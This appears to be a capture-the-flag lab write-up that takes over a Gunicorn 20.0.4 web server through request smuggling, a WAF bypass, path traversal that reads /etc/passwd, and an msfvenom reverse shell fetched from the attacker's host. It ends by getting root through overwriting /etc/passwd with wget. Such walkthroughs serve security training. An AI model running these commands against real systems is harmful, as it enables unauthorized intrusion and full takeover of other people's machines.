## Recon

### Nmap

```bash

SSH and a HTTP port on `13337`.

HTTP port running **Gunicorn 20.0.4**.

I found the [following blog post](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/) on a vulnerability matching this version:

![](../../../assets/eb617303b99b98c8e5b0caba3bfebae9.png)

Let's check the website for now.

![](../../../assets/fc3527c5e80d924166e36cbaf44c5144.png)

![](../../../assets/7eef5b5cf1c4b8829d1d4da1af29e7a5.png)

It gives us some endpoints with the intended usage.

Let's enumerate further and check for hidden directories.


### Feroxbuster

```bash
feroxbuster --url http://192.168.247.134:13337 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![](../../../assets/66081e2318c7b8c7e6cba4edf94d826d.png)

We don't see any hidden directories that differ from the ones on the website.


## Initial Foothold

### 13337/TCP - HTTP

We start testing the endpoints one by one and find out by checking the `/logs` endpoint that the **WAF** (web app firewall) is activated:

![](../../../assets/d5bd5cf5aea7e897c9742591679dad20.png)

From the previously found blog we find the following:

![](../../../assets/701faa46f3ed6feb72cf6d712b4c5187.png)

We need to specify the following header in order to smuggle the request:

```bash
X-Forwarded-For: localhost
```

Now when we initiate our request through repeater we see the following response:

![](../../../assets/46b49fc59102b0d9f1564868e412a0f6.png)

:::tip
Remember, *Error* = good!
:::

We get a 404 error but the text specifies that *no file has been specified*.

This means we just need to issue the file path to get access, let's try it out using `/etc/passwd`.

```bash
GET /logs?file=/etc/passwd HTTP/1.1
```

![](../../../assets/7fdc6afc350738f8fcef8ccb98026f1b.png)

Awesome, it worked! 

We notice the *clumsyadmin* user and their `/home` directory.


### local.txt

Using this technique we can get `local.txt` right away.

```bash
GET /logs?file=/home/clumsyadmin/local.txt HTTP/1.1
```

## Reverse Shell

![](../../../assets/eac71c2c0ba5ef88a2e7e406fffe83d7.png)

Via the `/update` endpoint we will upload a reverse shell payload created using `msfvenom`.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f elf -o shell
```

![](../../../assets/1d5298f33cdb0125d63267fc90d833fc.png)

We then add it to the request.

```bash
{
	"user":"clumsyadmin",
	"url":"http://192.168.45.236/shell"
}
```

![](../../../assets/a0013608afcb231321fc3180de0ff88c.png)

:::caution
Remember to switch the Request mode to *POST*.
:::

The response code is *200 - OK* which means the file has been succesfully uploaded, let's get our shell. For this we will go to the `/restart` endpoint and this should prompt the shell to work.

![](../../../assets/208c3690fd79e86a418e3f1d00771156.png)

Request via the endpoint wouldn't work, so I used Burp.

![](../../../assets/b4437e4523222f114803afda30b8de49.png)

![](../../../assets/2373c8049300fe59b5f7c6c773763093.png)

Then after upgrading our shell we can get to work on escalating privileges.


## Privilege Escalation

:::note
I uploaded my `id_rsa.pub` key as `authorized_keys` to the newly created `.ssh` folder on the target so I could get an SSH shell.
:::

![](../../../assets/7422dfccab35e6e070a11ed133fe9048.png)

We were not allowed to run `sudo -l`. 

![](../../../assets/ac646e55573a2eb56dfb1cf1236d8c56.png)

And we couldn't run `linpeas`.

I then enumerated the system some more:

![](../../../assets/b5a8b30b87e56e894a2faf7f4d883b0b.png)

![](../../../assets/0badad6fd904e80a101fdd5d739c616a.png)

![](../../../assets/267a0cc2f9476a0ed9d085f916f935a8.png)

After doing some searching I found this:

![](../../../assets/51904af152073b4241ae40d8cf0b26fb.png)

But the problem still existed of us not being able to `chmod` the script into an executable, thus rendering it useless.

![](../../../assets/d74f379a27688934aece0b73ec1b1519.png)

There was another PoC but this was yet again another script.

Let's check whether we can use any of the binaries.

:::note
We find the `/wget` binary to be particularly useful.
:::

![](../../../assets/e5e889f1b44897285c89af484b435f9d.png)

We can use the binary to overwrite the `/etc/passwd` file to upload our own `/etc/passwd` which allows us to `su` to `kali`.

```bash
/usr/bin/wget http://192.168.45.236/passwd -O /etc/passwd
```

We must now generate a new user and a new `passwd` file which we will upload:

```bash
# Generate new user
openssl passwd -1 -salt user3 pass123

# Create new passwd file
cat > passwd                         
user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash

# Overwrite existing /etc/passwd file
wget http://192.168.45.236/passwd -O /etc/passwd
```

![](../../../assets/a3265e054a516c36b69c6b2b5742b913.png)

And we have `root` privileges.
